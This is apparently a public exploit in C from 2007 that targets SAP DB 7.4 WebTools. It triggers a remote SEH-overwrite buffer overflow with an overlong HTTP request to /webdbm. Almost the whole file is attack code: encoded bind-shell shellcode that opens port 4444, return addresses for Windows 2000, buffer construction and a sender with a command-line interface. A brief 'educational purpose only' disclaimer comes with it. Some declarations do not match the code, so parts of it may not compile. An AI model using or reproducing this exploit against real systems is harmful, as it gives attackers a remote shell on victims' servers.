/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : SAP DB 7.4 WebTools 
* Site           : http://www.sapdb.org
* Found by       : NGSSoftware Insight Security Research 
* ----------------------------------------
* Exploit        : SAP DB 7.4 WebTools Remote SEH overwrite exploit
* Exploit date   : 07.07.2007
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows 2000 ALL SP 
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info           :   This is the SEH overwrite realization of the vulnerability found by 
*                  NGSSoftware Insight Security Research, it is trivial. We send a big amount
*                  of bytes to server (about 20000) and overwrite SEH. Aproximatly at the 9900
*                  byte we trigger an exception and our shellcode is executed.
* ----------------------------------------
* Compiling      :
*  To compile this exploit you need:
*    1. Windows C/C++ compiler   
*    2. WinSock 2
* ----------------------------------------
* Thanks to      :
*       1. NGSSoftware Insight Security Research ( http://www.ngssoftware.com/ )
*       2. The Metasploit project                ( http://metasploit.com       ) 
*       3. Dreatica-FXP crew                     ( http://www.dreatica.cl      )
* ----------------------------------------
* This exploit was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
************************************************************************************
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ctime>
#pragma comment(lib,"ws2_32")


void usage(char * s);
void logo();
void end_logo();
void prepare_shellcode(unsigned char * fsh, int sh);
void make_buffer(unsigned char * buf, int itarget, int sh);
int send_buffer(unsigned char * buf, char * remotehost, int port);
SOCKET do_connect (char *remotehost, int port);
int alphanumeric_encoder_thx_to_skylined(char *to_encode, char *encoded );

static long timeout = 2000 ; // 2 sec


// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------



struct _target{
	const char *t ;
	unsigned long ret ;
} targets[]=
	{
		{"UNIVERSAL: SAP DB 7.4.3 [WAPI.dll]",          0x1003a218 },// call ebx
		{"Windows 2000 Pro SP4 RUSSIAN [kernel32.dll]", 0x793a4a66 },// jmp ebx
		{"Windows 2000 Pro SP4 ENGLISH [kernel32.dll]", 0x7c4e4a66 },// jmp ebx
		{"Debug / DoS",                                 0x42424242 },
		{NULL,                                          0x00000000 }
	};


struct {
	const char * name;
	int length;
	char * shellcode;	
}shellcodes[]={ 	
	 {"Bindshell, port 4444   [ args: none ]", 696, 
		 /* win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com */
		"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x37\x49\x49\x49"
		"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x42"
		"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x52\x42\x32\x42\x41\x32"
		"\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x6a\x49\x4b\x4c\x62"
		"\x4a\x68\x6b\x30\x4d\x59\x78\x49\x69\x4b\x4f\x79\x6f\x69\x6f\x71"
		"\x70\x4e\x6b\x32\x4c\x51\x34\x64\x64\x6e\x6b\x41\x55\x77\x4c\x4c"
		"\x4b\x71\x6c\x35\x55\x64\x38\x54\x41\x58\x6f\x4c\x4b\x30\x4f\x47"
		"\x68\x4e\x6b\x53\x6f\x47\x50\x74\x41\x58\x6b\x70\x49\x4c\x4b\x35"
		"\x64\x6c\x4b\x36\x61\x68\x6e\x57\x41\x79\x50\x6f\x69\x4c\x6c\x6c"
		"\x44\x4b\x70\x63\x44\x43\x37\x5a\x61\x78\x4a\x44\x4d\x36\x61\x6a"
		"\x62\x38\x6b\x78\x74\x77\x4b\x51\x44\x74\x64\x76\x48\x51\x65\x4a"
		"\x45\x4e\x6b\x73\x6f\x61\x34\x55\x51\x5a\x4b\x71\x76\x6c\x4b\x64"
		"\x4c\x72\x6b\x4e\x6b\x63\x6f\x57\x6c\x75\x51\x7a\x4b\x33\x33\x34"
		"\x6c\x6c\x4b\x6e\x69\x72\x4c\x45\x74\x45\x4c\x30\x61\x4f\x33\x50"
		"\x31\x69\x4b\x61\x74\x6c\x4b\x57\x33\x66\x50\x4e\x6b\x43\x70\x64"
		"\x4c\x6e\x6b\x32\x50\x65\x4c\x6e\x4d\x6e\x6b\x77\x30\x67\x78\x31"
		"\x4e\x33\x58\x6c\x4e\x30\x4e\x34\x4e\x5a\x4c\x50\x50\x4b\x4f\x69"
		"\x46\x72\x46\x62\x73\x70\x66\x35\x38\x57\x43\x35\x62\x45\x38\x30"
		"\x77\x63\x43\x44\x72\x71\x4f\x71\x44\x79\x6f\x4a\x70\x73\x58\x78"
		"\x4b\x48\x6d\x4b\x4c\x77\x4b\x56\x30\x79\x6f\x7a\x76\x51\x4f\x6f"
		"\x79\x79\x75\x32\x46\x4b\x31\x48\x6d\x43\x38\x45\x52\x70\x55\x73"
		"\x5a\x33\x32\x6b\x4f\x4a\x70\x72\x48\x69\x49\x36\x69\x4c\x35\x6e"
		"\x4d\x50\x57\x4b\x4f\x6a\x76\x36\x33\x36\x33\x61\x43\x33\x63\x62"
		"\x73\x43\x73\x36\x33\x50\x43\x63\x63\x4b\x4f\x68\x50\x43\x56\x71"
		"\x78\x62\x31\x51\x4c\x30\x66\x30\x53\x6b\x39\x78\x61\x4c\x55\x65"
		"\x38\x4e\x44\x67\x6a\x74\x30\x6f\x37\x70\x57\x69\x6f\x6e\x36\x32"
		"\x4a\x36\x70\x43\x61\x32\x75\x79\x6f\x4e\x30\x50\x68\x4f\x54\x6e"
		"\x4d\x64\x6e\x6d\x39\x52\x77\x79\x6f\x58\x56\x66\x33\x36\x35\x69"
		"\x6f\x4e\x30\x45\x38\x38\x65\x72\x69\x6b\x36\x77\x39\x33\x67\x79"
		"\x6f\x6e\x36\x70\x50\x31\x44\x62\x74\x73\x65\x6b\x4f\x58\x50\x6d"
		"\x43\x50\x68\x4b\x57\x44\x39\x4f\x36\x64\x39\x71\x47\x6b\x4f\x49"
		"\x46\x63\x65\x6b\x4f\x4a\x70\x71\x76\x50\x6a\x50\x64\x50\x66\x70"
		"\x68\x50\x63\x52\x4d\x6e\x69\x58\x65\x32\x4a\x46\x30\x63\x69\x45"
		"\x79\x48\x4c\x4c\x49\x7a\x47\x63\x5a\x70\x44\x4d\x59\x78\x62\x36"
		"\x51\x39\x50\x38\x73\x4f\x5a\x6b\x4e\x41\x52\x64\x6d\x6b\x4e\x32"
		"\x62\x36\x4c\x4e\x73\x4c\x4d\x43\x4a\x34\x78\x4c\x6b\x6e\x4b\x6e"
		"\x4b\x51\x78\x70\x72\x6b\x4e\x4e\x53\x47\x66\x4b\x4f\x32\x55\x50"
		"\x44\x4b\x4f\x7a\x76\x43\x6b\x70\x57\x62\x72\x46\x31\x66\x31\x32"
		"\x71\x30\x6a\x35\x51\x33\x61\x32\x71\x33\x65\x53\x61\x4b\x4f\x5a"
		"\x70\x30\x68\x6e\x4d\x6e\x39\x73\x35\x7a\x6e\x62\x73\x4b\x4f\x48"
		"\x56\x63\x5a\x6b\x4f\x59\x6f\x57\x47\x39\x6f\x6e\x30\x4e\x6b\x30"
		"\x57\x59\x6c\x4b\x33\x38\x44\x45\x34\x59\x6f\x39\x46\x50\x52\x39"
		"\x6f\x58\x50\x65\x38\x38\x70\x6e\x6a\x37\x74\x53\x6f\x31\x43\x6b"
		"\x4f\x6a\x76\x6b\x4f\x78\x50\x42"		
	 },	 
	{NULL , NULL }
};



int main(int argc, char **argv)
{
	char * remotehost=NULL;
	char default_remotehost[]="127.0.0.1";
	char temp1[100], temp2[100];
	int port, itarget, sh;
	SOCKET s;
	char c;	
	int option_index=0;
	logo();
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}

	// set defaults
	port=9999;
	itarget=-1;
	sh=0;
	// ------------	
	
	while((c = getopt(argc, argv, "h:p:t:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 	
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'p':
				sscanf(optarg, "%d", &port);
				break;			
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		
	}	
	if(remotehost == NULL) remotehost=default_remotehost;
	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(" #  Host    : %s%s# \n", remotehost, temp1);	
	sprintf(temp2, "%d", port);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  Port    : %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, "%s", shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(" #  Payload : %s%s# \n", temp2, temp1);	
	if(itarget!=-1)
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 58 - strlen(targets[itarget].t) -1);	
		printf(" #  Target  : %s%s# \n", targets[itarget].t, temp1);		
	}else
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 58 - strlen("Please select target") -1);	
		printf(" #  Target  : %s%s# \n", "Please select target", temp1);
	}
	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);
	printf("   [+] Checking if server is online\n");
	fflush(stdout);
	s=do_connect(remotehost, port);   
	if(s==-1)
	{
		printf("   [-] Server is OFFLINE\n");
		end_logo();
		return 0;
	}
	closesocket(s);
	printf("   [+] Server is ONLINE\n");

	
	unsigned char buf[30000];
	memset(buf,0,sizeof(buf));
	fflush(stdout);
	
	make_buffer(buf, itarget, sh);
	printf("   [+] Attacking buffer constructed\n");
	if(send_buffer(buf, remotehost,port)==-1)
	{
		printf("   [-] Cannot exploit server %s\n", remotehost);
		end_logo();
		WSACleanup();
		return -1;
	}

	printf("   [+] Buffer sent\n");
	printf("   [+] Connect to %s:%d\n", remotehost, 4444);
	end_logo();
	WSACleanup();
	return 0;
}



SOCKET do_connect (char *remotehost, int port)
{
   static struct hostent *host;
   static struct sockaddr_in addr;
   SOCKET s;	
       host = gethostbyname(remotehost);
       if (!host)
       {
           perror("[-] gethostbyname() failed");
           return -1;
       }
       addr.sin_addr = *(struct in_addr*)host->h_addr;

   s = socket(PF_INET, SOCK_STREAM, 0);
   if (s == -1)
   {
       closesocket(s);
       perror("socket() failed");
       return -1;
   }

   addr.sin_port = htons(port);
   addr.sin_family = AF_INET;

	if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == -1)
   {
       closesocket(s);     
       return -1;
   }	

   return s;
}


void prepare_shellcode(unsigned char * fsh, unsigned int * fshlength, int sh)
{
	memcpy(fsh, shellcodes[sh].shellcode, shellcodes[sh].length);
	*fshlength = shellcodes[sh].length;	
}

void make_buffer(unsigned char * buf, int itarget, int sh)
{
	// prepare shellcode
	unsigned char fsh[10000];	
	unsigned int fshlength;
	memset(fsh, 0, sizeof(fsh));	
	prepare_shellcode(fsh, &fshlength, sh);
	// -----------------

	// make buffer
	unsigned char * cp=buf;		
		
		// HTTP request
	memcpy(cp, "GET /webdbm?Event=DBM_INTERN_TEST&Action=REFRESH&HTTP_COOKIE=", strlen("GET /webdbm?Event=DBM_INTERN_TEST&Action=REFRESH&HTTP_COOKIE="));
	cp +=strlen((char *)cp);

		// long request
	memset(cp, 'A', 20774);
	cp +=strlen((char *)cp);

		// jmp over 6 bytes
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\xEB';
	*cp++ = '\x06';
	

		// SEH handler
	*cp++ = (char)((targets[itarget].ret      ) & 0xff);
	*cp++ = (char)((targets[itarget].ret >>  8) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 16) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 24) & 0xff);

		// jff
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';
	
		// copy shellcode
	memcpy(cp, fsh, fshlength);
	cp+=fshlength;

		// end of HTTP request
	memcpy(cp, " HTTP/1.0\r\n\r\n", strlen(" HTTP/1.0\r\n\r\n"));
	cp +=strlen((char *)cp);
	// -----------------
}



int send_buffer(unsigned char * buf, char * remotehost, int port)
{	
	SOCKET sock;
	int bytes;

	sock = do_connect(remotehost, port);
	if(sock==-1) printf("   [-] Failed to connect to server\n");		
	bytes = send(sock, (char *)buf, (int)strlen((char *)buf), 0);
	if (bytes<0) printf("   [-] Failed to send the buffer\n"); else printf("   [+] Sent %d bytes\n", bytes);	
	closesocket(sock);
	return 1;
}


// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------


void usage(char * s)
{	
	printf("   Usage : %s -h <host> -p <port> -t <target>\n", s);
	printf("   Arguments:\n");
	printf("      -h <host>     host to connect\n");
	printf("      -p <port>     port (default: 9999)\n");
	printf("      -t <target>   target to attack\n");
	printf("    Shellcodes:\n");
	for(int i=0; shellcodes[i].name!=0;i++)
	{
		printf("       %d. %s\n",i+1,shellcodes[i].name);				
	}	
	printf("\n");
	printf("    Targets:\n");
	for(int j=0; targets[j].t!=0;j++)
	{
		printf("       %d. %s\n",j+1,targets[j].t);
	}		
	printf("\n");
	end_logo();	
}

void logo()
{
	printf("\n\n");
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : SAP DB 7.4 WebTools Remote SEH overwrite exploit         # \n");
	printf(" #  Author  : Heretic2 (heretic2x@gmail.com                            # \n");
	printf(" #  Research: NGSSoftware Insight Security Research                    # \n");
	printf(" #  Version : 1.0 Public Release                                       # \n");
	printf(" #  System  : Windows 2000 ALL SP                                      # \n");
	printf(" #  Date    : 07.07.2007                                               # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}

void end_logo()
{
	printf(" # ------------------------------------------------------------------- # \n");
	printf(" #                    Dreatica-FXP crew [Heretic2]                     # \n");	
	printf(" ####################################################################### \n\n");
}

// milw0rm.com [2007-07-07]
